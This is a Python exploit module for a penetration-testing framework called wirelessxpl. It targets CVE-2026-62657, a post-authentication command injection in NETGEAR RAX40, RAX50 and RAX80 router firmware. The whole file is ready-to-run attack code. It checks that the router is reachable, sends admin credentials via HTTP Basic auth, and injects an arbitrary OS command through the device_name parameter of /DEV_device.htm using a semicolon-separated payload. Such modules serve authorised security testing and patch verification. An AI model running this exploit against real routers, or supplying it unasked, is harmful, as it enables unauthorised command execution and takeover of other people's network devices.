# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR RAX Series Web Admin Command Injection (CVE-2026-62657).

    The web administration interface on NETGEAR RAX series routers
    contains a post-authentication command injection vulnerability.
    The ``device_name`` parameter in the device management page is
    passed to a system() call without proper sanitization. An attacker
    with admin credentials can inject arbitrary OS commands.

    CVSS v3.1: 6.8 (Medium), AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR RAX Web Admin Command Injection (CVE-2026-62657)",
        "description": (
            "Exploits CVE-2026-62657 via post-auth command injection "
            "in the device management page of NETGEAR RAX routers. "
            "The device_name parameter is unsanitized, enabling OS "
            "command injection with admin credentials."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-62657",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-06-12",
        "platform": "linux",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "NETGEAR RAX40 (firmware < 1.0.12.128)",
            "NETGEAR RAX50 (firmware < 1.0.12.128)",
            "NETGEAR RAX80 (firmware < 1.0.12.128)",
        ),
    }

    target = OptIP("", "Target router IP")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject")
    username = OptString("admin", "Admin username")
    password = OptString("password", "Admin password")

    _DEVICE_PATH = "/DEV_device.htm"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_post_auth(self, path: str, data: dict) -> tuple[int, str]:
        url = self._build_url(path)
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        import base64
        creds = base64.b64encode(
            f"{self.username}:{self.password}".encode()
        ).decode()
        req.add_header("Authorization", f"Basic {creds}")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if the web admin interface is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return

        print_success("Web admin interface reachable; injecting command")
        self._exploit()

    def _exploit(self) -> None:
        injected = f"MyRouter;{self.command};"

        payload = {
            "device_name": injected,
            "submit_flag": "apply_device",
        }

        print_status(f"Injecting via device_name: {injected!r}")

        status, body = self._http_post_auth(self._DEVICE_PATH, payload)

        if status == 200:
            print_success(
                f"HTTP {status}. Command '{self.command}' should have "
                f"executed on the router."
            )
        elif status == 401:
            print_error("Authentication failed; check credentials")
        else:
            print_error(f"Unexpected HTTP {status}")
